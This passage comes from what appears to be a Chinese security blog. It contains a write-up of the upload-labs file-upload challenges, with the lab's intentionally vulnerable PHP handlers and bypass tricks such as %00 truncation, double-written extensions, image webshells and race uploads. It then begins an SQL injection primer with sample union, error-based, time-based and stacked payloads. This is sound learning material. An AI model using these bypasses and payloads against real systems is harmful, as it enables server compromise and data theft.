class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一题没有重写文件名，故可以采用phpinfo.php. .尝试绕过（$file_ext=(空格)）</p>
<h3 id="pass-10"><a href="#pass-10" class="headerlink" title="pass 10"></a>pass 10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,</span><br><span class="line">        <span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,</span><br><span class="line">        <span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,</span><br><span class="line">        <span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,</span><br><span class="line">        <span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到str_ireplace 方法的时候就可以想到双写绕过了，故phpinfo.phphpp过</p>
<h3 id="pass-11-12"><a href="#pass-11-12" class="headerlink" title="pass 11-12"></a>pass 11-12</h3><p>这两题的共同特点是通过%00截断过waf<br>抓包或者审计源码可以发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">$file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">    $img_path = ($_POST[<span class="string">'save_path'</span>]或者$_GET[<span class="string">'save_path'</span>]).<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是白名单加上传递参数定义存储文件路径<br>这里save_path可以被修改，如果传入/upload/phpinfo.php%00.jpg<br>在move_upload_path函数中%00会产生截断字符串的效果，从而实际写入路径变为/upload/phpinfo.php绕过成功</p>
<p>00截断的要求有两个，一个是php版本小于5.3.4，另外一个是php的magic_quotes_gpc必须关闭，因为它会过滤get和post的请求中的\</p>
<p>%00在路径中被解析后，字符串会变为phpinfo.php\000.jpg，而\000在c语言中是终止符，因为php的底层实现四c语言，所以会产生这样的结果。</p>
<p>%00在get,post，甚至cookie都有效</p>
<p>如果需要在文件命中使用截断，则需要使用修改.php后的字节，例如.php(0x00).jpg格式（输入的时候不需要括号，可以在bp中hex内改）</p>
<h3 id="pass-13-15"><a href="#pass-13-15" class="headerlink" title="pass 13-15"></a>pass 13-15</h3><p>内容检查图片码<br>制作方法<br>cat xxx.jpg xxx.php&gt; xxx.php</p>
<p>上传的时候需要修改后缀名和mime type</p>
<h3 id="pass-16"><a href="#pass-16" class="headerlink" title="pass 16"></a>pass 16</h3><p>二次渲染</p>
<p>gif上传之后和自己制作的图片码比较，将代码插入没有变化的位置。</p>
<p>png和jpg上传都是采用了现成脚本<br>参考了这篇文章 <a href="https://xz.aliyun.com/t/2657#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-4</a></p>
<h3 id="pass-17"><a href="#pass-17" class="headerlink" title="pass 17"></a>pass 17</h3><p>竞争上传,主要的问题是使用move_uploaded_file之后rename，rename耗时较多，故上传线程开到5-6，然后浏览器多访问几次就成功。</p>
<h3 id="pass-18"><a href="#pass-18" class="headerlink" title="pass 18"></a>pass 18</h3><p>这段代码的逻辑其实是和17很相似，核心的问题是在move()和rename()这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</span><br><span class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>竞争上传，多线程上传phpinfo.php.7z到apache上，可利用apache解析漏洞解析php</p>
<h3 id="pass-19-20"><a href="#pass-19-20" class="headerlink" title="pass 19-20"></a>pass 19-20</h3><p>move_uploaded_file() 忽略/.<br>上传phpinfo.php/.  move_uploaded_file生成的新文件变为phpinfo.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//19</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,</span><br><span class="line">        <span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,</span><br><span class="line">        <span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,</span><br><span class="line">        <span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题主要考了两个点，一个是move_uploaded_file忽略/.，另外一个是逻辑漏洞<br>逻辑漏洞主要是在$file_name=reset($file).’/‘.$file[count($file)-1];<br>取file数组的第一个元素和file的最后一个元素形成路径。而count函数的值代表了数组非空元素的个数</p>
<p>代码主要的问题是处在上传save_name为数组时，检查ext时是检测save_name的最后一个元素，现在比较理想的情况是构造一个可以解析的文件后缀<br>大概是xxx.php.xxx, 这就要求了$file[count($file)-1]和end($file)代表了不同的元素，那么传入两个元素save_name[0]=phpinfo.php<br>save_name[2]=.jpg,刚好能满足要求。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//20</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://wanghuidi.github.io/2019/06/24/文件上传漏洞/" data-id="ck2jra67d000rfbtlb7bm70tr" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件上传/">文件上传</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-sql注入初步" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/05/sql注入初步/" class="article-date">
  <time datetime="2019-06-05T00:11:21.000Z" itemprop="datePublished">2019-06-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/05/sql注入初步/">sql注入初步</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是这段时间来学习sql注入的一个小结，想分几篇文章来讨论下sql注入的一些内容和在ctf比赛中的具体实例。</p>
<h2 id="常规sql注入的几个分类"><a href="#常规sql注入的几个分类" class="headerlink" title="常规sql注入的几个分类"></a>常规sql注入的几个分类</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>  联合注入是一种有回显的注入，主要的利用手法是通过union查询结果覆盖合法查询结果以得到数据库中更多内容，常见于搜索框中。类似于 xxx.xxx?id=1’ union select 1,2,3– ，而页面回显包含1，2，3。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>  报错注入也是一种常见的注入方式，主要是利用数据库的某些机制人为地制造出错误条件，使查询结果出现在错误信息中。个人比较常用的主要有两种方式，一种是通过xpath语法错误报错，例如 id=1’ and extractvalue(concat(0x7e,database(),0x7e))–，另外一种是通过几何函数报错（只测试过mysql）id=1’ and ploygon(id)</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>  延时注入主要是在页面无回显或者报错联合以及布尔盲注失效的时候考虑的一种做法，主要有两种思路，一种是构造布尔条件利用数据库特有函数延时，另外一种是通过耗时较长的运算来模拟延时。例如mysql中的benchmark函数。<br>  例如 id=1’ or if(mid(database(),1,1)=’a’,sleep(5),0)– </p>
<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>  布尔注入主要是页面回显受限的时候的一种做法，构造布尔条件，但条件不同时页面回显不同，这说明存在布尔注入<br>  例如 id=1’ or if(mid(database(),1,1)=’a’,1,0)–<br>  如果条件成立页面返回id=1的查询结果，但不成立时页面无回显</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>  堆叠注入我碰到的不是特别多，印象比较深刻的就是强网杯的那道注入题（经验不足，看到select被过滤了还在傻傻地想办法绕过）。主要的问题是允许执行多条sql语句的，例如php的pdo。那么可以将sql截断后附上想要执行的sql语句，在无回显的情况下考虑update或者insert，有回显的情况下考虑使用procedure执行编码后的sql语句来绕过过滤<br>  例如 id=1’;show tables;<br>  回显tables的信息</p>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h2 id="注入中几个常见的场景"><a href="#注入中几个常见的场景" class="headerlink" title="注入中几个常见的场景"></a>注入中几个常见的场景</h2><h3 id="where-后存在注入"><a href="#where-后存在注入" class="headerlink" title="where 后存在注入"></a>where 后存在注入</h3><p>  多见于查询框，登录表单中，后台语句类似于这样<br>  <code>select * from users where username='$_GET['username']'</code><br>  闭合username后即可利用</p>
<h3 id="insert和update中存在注入"><a href="#insert和update中存在注入" class="headerlink" title="insert和update中存在注入"></a>insert和update中存在注入</h3><p>  举insert为例<br>  <code>insert into users('username','password')values("$_POST['username']","$_POST['password']");<br>  闭合""和）后构造语句即可利用<br>  </code></p>
<h3 id="limit后存在注入"><a href="#limit后存在注入" class="headerlink" title="limit后存在注入"></a>limit后存在注入</h3><p>  <code>select * from users where id=1 limit 1,$_GET['max']</code><br>  补齐limit后对应数量，然后可以采用produre analyse()来进行延时注入或者报错注入</p>
